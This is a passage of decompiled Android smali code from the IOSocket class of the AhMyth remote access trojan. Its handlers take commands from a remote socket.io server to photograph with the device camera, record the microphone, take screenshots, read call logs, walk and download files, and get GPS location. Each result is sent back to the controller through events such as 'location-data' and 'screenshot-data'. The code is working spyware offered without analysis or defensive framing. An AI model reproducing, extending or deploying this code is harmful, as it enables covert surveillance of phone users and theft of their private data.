    invoke-static {v0, v3, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 207
    :goto_3
    sget-object p0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object p0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/Object;

    aput-object v1, v0, v2

    const-string v1, "send-sms-result"

    invoke-virtual {p0, v1, v0}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :goto_4
    return-void
.end method

.method static synthetic lambda$connect$13([Ljava/lang/Object;)V
    .locals 4

    const-string v0, "IOSocket"

    const/4 v1, 0x0

    .line 215
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_2

    .line 216
    aget-object p0, p0, v1

    .line 217
    instance-of v2, p0, Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "cameraID"

    if-eqz v2, :cond_0

    .line 218
    :try_start_1
    check-cast p0, Lorg/json/JSONObject;

    invoke-virtual {p0, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    :goto_0
    move v1, p0

    goto :goto_1

    .line 219
    :cond_0
    instance-of v2, p0, Ljava/lang/String;

    if-eqz v2, :cond_1

    .line 220
    new-instance v2, Lorg/json/JSONObject;

    check-cast p0, Ljava/lang/String;

    invoke-direct {v2, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 221
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    goto :goto_0

    .line 222
    :cond_1
    instance-of v2, p0, Ljava/lang/Integer;

    if-eqz v2, :cond_2

    .line 223
    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v2, "Error leyendo cameraID en get-photo"

    .line 227
    invoke-static {v0, v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 229
    :cond_2
    :goto_1
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "get-photo usando cameraID="

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 230
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    return-void
.end method

.method static synthetic lambda$connect$14([Ljava/lang/Object;)V
    .locals 3

    .line 235
    new-instance p0, Lahmyth/mine/king/ahmyth/CameraManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object p0

    .line 236
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "{}"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "camera-list"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$15([Ljava/lang/Object;)V
    .locals 3

    const-string v0, "/"

    const/4 v1, 0x0

    .line 243
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_0

    aget-object v2, p0, v1

    instance-of v2, v2, Ljava/lang/String;

    if-eqz v2, :cond_0

    .line 244
    aget-object p0, p0, v1

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, p0

    goto :goto_0

    :catch_0
    nop

    .line 247
    :cond_0
    :goto_0
    invoke-static {v0}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p0

    .line 248
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_1

    :cond_1
    const-string p0, "[]"

    :goto_1
    aput-object p0, v2, v1

    const-string p0, "files-data"

    invoke-virtual {v0, p0, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$16([Ljava/lang/Object;)V
    .locals 3

    const-string v0, ""

    .line 255
    :try_start_0
    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object v2, p0, v1

    instance-of v2, v2, Ljava/lang/String;

    if-eqz v2, :cond_0

    .line 256
    aget-object p0, p0, v1

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, p0

    .line 259
    :catch_0
    :cond_0
    invoke-static {v0}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic lambda$connect$18([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-location"

    .line 265
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 267
    :try_start_0
    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V

    .line 268
    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$siFYXxEveMZsuVUukYR2QO6zm34;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$siFYXxEveMZsuVUukYR2QO6zm34;

    invoke-virtual {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;->getLocationAsync(Lahmyth/mine/king/ahmyth/LocManager$LocationResultCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "Error obteniendo ubicaci\u00f3n para location-data"

    .line 286
    invoke-static {p0, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 287
    new-instance p0, Lorg/json/JSONObject;

    invoke-direct {p0}, Lorg/json/JSONObject;-><init>()V

    :try_start_1
    const-string v1, "error"

    .line 288
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 289
    :catch_1
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "location-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :goto_0
    return-void
.end method

.method static synthetic lambda$connect$2([Ljava/lang/Object;)V
    .locals 2

    .line 91
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Error de conexi\u00f3n al socket: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object p0, p0, v1

    goto :goto_0

    :cond_0
    const-string p0, ""

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "IOSocket"

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$20([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-screenshot"

    .line 297
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 299
    :try_start_0
    new-instance v0, Lahmyth/mine/king/ahmyth/ScreenshotManager;

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/ScreenshotManager;-><init>(Landroid/content/Context;)V

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Ra4tioB-IKEdV2ZC3AiIC2r7L6E;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Ra4tioB-IKEdV2ZC3AiIC2r7L6E;

    invoke-virtual {v0, v1}, Lahmyth/mine/king/ahmyth/ScreenshotManager;->takeScreenshot(Lahmyth/mine/king/ahmyth/ScreenshotManager$ScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "Error en takeScreenshot:"

    .line 317
    invoke-static {p0, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 318
    new-instance p0, Lorg/json/JSONObject;

    invoke-direct {p0}, Lorg/json/JSONObject;-><init>()V

    const/4 v1, 0x0

    :try_start_1
    const-string v2, "file"

    .line 320
    invoke-virtual {p0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v2, "error"

    .line 321
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    .line 323
    :catch_1
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    aput-object p0, v2, v1

    const-string p0, "screenshot-data"

    invoke-virtual {v0, p0, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :goto_0
    return-void
.end method

.method static synthetic lambda$connect$3([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Timeout de conexi\u00f3n al socket"

    .line 95
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$4([Ljava/lang/Object;)V
    .locals 2

    .line 99
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Error en el socket: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    array-length v1, p0

    if-lez v1, :cond_0

    const/4 v1, 0x0

    aget-object p0, p0, v1

    goto :goto_0

    :cond_0
    const-string p0, ""

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "IOSocket"

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$5([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Reconectado al socket"

    .line 103
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$6([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Intentando reconectar al socket"

    .line 107
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$7([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Fall\u00f3 la reconexi\u00f3n al socket"

    .line 111
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$8([Ljava/lang/Object;)V
    .locals 4

    const-string v0, "MIC"

    const-string v1, "Evento mic-record recibido"

    .line 121
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const/16 v1, 0xa

    .line 124
    :try_start_0
    array-length v2, p0

    if-lez v2, :cond_2

    const/4 v2, 0x0

    .line 125
    aget-object p0, p0, v2

    .line 126
    instance-of v2, p0, Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "seconds"

    if-eqz v2, :cond_0

    .line 127
    :try_start_1
    check-cast p0, Lorg/json/JSONObject;

    invoke-virtual {p0, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    :goto_0
    move v1, p0

    goto :goto_1

    .line 128
    :cond_0
    instance-of v2, p0, Ljava/lang/String;

    if-eqz v2, :cond_1

    .line 129
    new-instance v2, Lorg/json/JSONObject;

    check-cast p0, Ljava/lang/String;

    invoke-direct {v2, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 130
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p0

    goto :goto_0

    .line 131
    :cond_1
    instance-of v2, p0, Ljava/lang/Integer;

    if-eqz v2, :cond_2

    .line 132
    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string v2, "Error leyendo segundos en mic-record"

    .line 136
    invoke-static {v0, v2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 138
    :cond_2
    :goto_1
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Ejecutando grabaci\u00f3n de micr\u00f3fono por "

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " segundos"

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 141
    invoke-static {}, Lahmyth/mine/king/ahmyth/MicManager;->isRecording()Z

    move-result p0

    if-eqz p0, :cond_3

    const-string p0, "\u26a0\ufe0f Ya hay una grabaci\u00f3n en progreso, ignorando solicitud"

    .line 142
    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 147
    :cond_3
    :try_start_2
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p0

    .line 149
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Error en startRecording: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_2
    return-void
.end method

.method static synthetic lambda$connect$9([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-calls"

    .line 155
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 156
    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object p0

    .line 157
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "calls-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$null$17(Landroid/location/Location;Ljava/lang/String;)V
    .locals 4

    .line 269
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "error"

    if-eqz p0, :cond_0

    :try_start_0
    const-string p1, "lat"

    .line 272
    invoke-virtual {p0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p1, "lng"

    .line 273
    invoke-virtual {p0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v2

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p1, "accuracy"

    .line 274
    invoke-virtual {p0}, Landroid/location/Location;->getAccuracy()F

    move-result p0

    float-to-double v2, p0

    invoke-virtual {v0, p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string p0, "timestamp"

    .line 275
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v0, p0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    goto :goto_2

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_0
    if-eqz p1, :cond_1

    goto :goto_0

    :cond_1
    const-string p1, "No location available"

    .line 277
    :goto_0
    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 280
    :goto_1
    :try_start_1
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Exception: "

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 283
    :catch_1
    :goto_2
    sget-object p0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object p0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 p1, 0x1

    new-array p1, p1, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object v0, p1, v1

    const-string v0, "location-data"

    invoke-virtual {p0, v0, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$null$19([BLjava/lang/String;)V
    .locals 6

    .line 300
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v1, 0x1

    const-string v2, "IOSocket"

    const/4 v3, 0x0

    const-string v4, "file"

    if-eqz p0, :cond_0

    .line 302
    :try_start_0
    array-length v5, p0

    if-lez v5, :cond_0

    const/4 p1, 0x2

    .line 303
    invoke-static {p0, p1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    .line 304
    invoke-virtual {v0, v4, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string p1, "buffer"

    .line 305
    invoke-virtual {v0, p1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 306
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Screenshot base64 generado: "

    invoke-virtual {p1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p0, " caracteres"

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v2, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    :catch_0
    move-exception p0

    goto :goto_1

    .line 308
    :cond_0
    invoke-virtual {v0, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string p0, "error"

    if-eqz p1, :cond_1

    goto :goto_0

    :cond_1
    const-string p1, "No screenshot data"

    .line 309
    :goto_0
    invoke-virtual {v0, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    const-string p1, "Error creando JSON de screenshot"

    .line 312
    invoke-static {v2, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 314
    :goto_2
    sget-object p0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object p0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    new-array p1, v1, [Ljava/lang/Object;

    aput-object v0, p1, v3

    const-string v0, "screenshot-data"

    invoke-virtual {p0, v0, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 2

    .line 351
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "IOSocket"

    if-nez v0, :cond_0

    const-string v0, "getIoSocket() llamado pero ioSocket es null."

    .line 352
    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 353
    :cond_0
    invoke-virtual {v0}, Lio/socket/client/Socket;->connected()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "getIoSocket() llamado pero el socket NO est\u00e1 conectado."

    .line 354
    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 356
    :cond_1
    :goto_0
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
